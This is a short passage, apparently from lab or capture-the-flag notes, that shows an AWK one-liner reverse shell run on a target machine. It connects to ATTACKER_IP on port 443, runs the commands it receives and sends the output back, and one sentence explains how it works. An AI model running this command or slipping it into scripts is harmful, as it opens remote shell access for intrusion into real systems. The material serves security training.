```sh
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Uses AWKâ€™s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
